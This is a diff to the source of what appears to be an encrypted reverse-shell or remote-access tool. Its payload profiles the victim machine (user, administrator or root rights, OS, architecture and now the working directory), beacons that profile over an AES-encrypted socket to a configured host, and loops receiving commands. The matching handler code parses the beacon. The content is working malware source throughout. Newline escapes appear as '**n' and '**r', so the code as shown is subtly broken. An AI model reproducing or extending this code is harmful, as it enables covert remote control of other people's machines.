@@ -169,6 +169,8 @@ if os.name == 'nt':
 	###################################################################################################
 
 	pwdvar = 'cd'
+	pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
+	paddedpwd = pwd.strip('**r') + '*' * (64 - len(pwd.strip('**r')))
 	adm = fsubprocess('whoami').strip('**n').strip('**r')
 	stdout = fsubprocess('net localgroup administrators | find "%USERNAME%"').strip('**n').strip('**r')
 
@@ -208,39 +210,42 @@ persistpart = '''	else:
 part2 = '''
 	if is64:
 		if isSystem:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSY%s' % (paddedopsys, starpadding))
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSY%s%s' % (paddedopsys, paddedpwd, starpadding))
 		else:
 			if isAdmin:
-				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAY%s' % (paddedopsys, starpadding))
+				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAY%s%s' % (paddedopsys, paddedpwd, starpadding))
 			else:
-				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFY%s' % (paddedopsys, starpadding))
+				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFY%s%s' % (paddedopsys, paddedpwd, starpadding))
 	else:
 		if isSystem:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSH%s' % (paddedopsys, starpadding))
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSH%s%s' % (paddedopsys, paddedpwd, starpadding))
 		else:
 			if isAdmin:
-				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAH%s' % (paddedopsys, starpadding))
+				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAH%s%s' % (paddedopsys, paddedpwd, starpadding))
 			else:
-				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFH%s' % (paddedopsys, starpadding))
+				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFH%s%s' % (paddedopsys, paddedpwd, starpadding))
 
 elif os.name == 'posix':
 	if os.getuid() == 0:
 		isSystem = True
 	pwdvar = 'pwd'
+	pwd = fsubprocess(pwdvar).strip('**n')
+	paddedpwd = pwd + '*' * (64 - len(pwd))
 	if isSystem:
 		if is64:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLY%s' % (paddedopsys, starpadding))
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLY%s%s' % (paddedopsys, paddedpwd, starpadding))
 		else:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLH%s' % (paddedopsys, starpadding))
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLH%s%s' % (paddedopsys, paddedpwd, starpadding))
 	else:
 		if is64:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s' % (paddedopsys, starpadding))
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s%s' % (paddedopsys, paddedpwd, starpadding))
 		else:
-			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s' % (paddedopsys, starpadding))
+			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s%s' % (paddedopsys, paddedpwd, starpadding))
 
 else:
 	pwdvar = 'pwd'
-	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s' % (paddedopsys, starpadding))
+	pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
+	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s%s' % (paddedopsys, paddedpwd, starpadding))
 
                                # HTTP PROXY SETTINGS - proxies can only be HTTP/S !
 useproxy = False               # Set to True to use the proxy.
@@ -256,7 +261,6 @@ else:
 
 s.connect((host, port))
 s.send(success)
-pwd = fsubprocess(pwdvar).strip('**n').strip('**r')
 
 while 1:
 	data = s.recv(2048)
@@ -649,8 +653,6 @@ while True:
 		if 'is not recognized as an internal' not in decrypted and ': not found' not in decrypted:
 			checkpath = decrypted.split('**n')[-2].strip('**n').strip('**r')
 			if '[X]' not in checkpath and '[*]' not in checkpath:
-				if ':' in checkpath:
-					isWindows = True
 				pwd = checkpath.strip('**r')
 				newpwd = True
 		if newpwd:
@@ -662,6 +664,9 @@ while True:
 
 	elif decrypted.endswith('*' * 16):							## Get system info
 		opsys = decrypted[64:128].strip('*')
+		pwd = decrypted[144:208].strip('*')
+		if ':' in pwd:
+			isWindows = True
 		if decrypted[143:144] == 'Y':
 			is64 = True
 			archvar = 'x64'
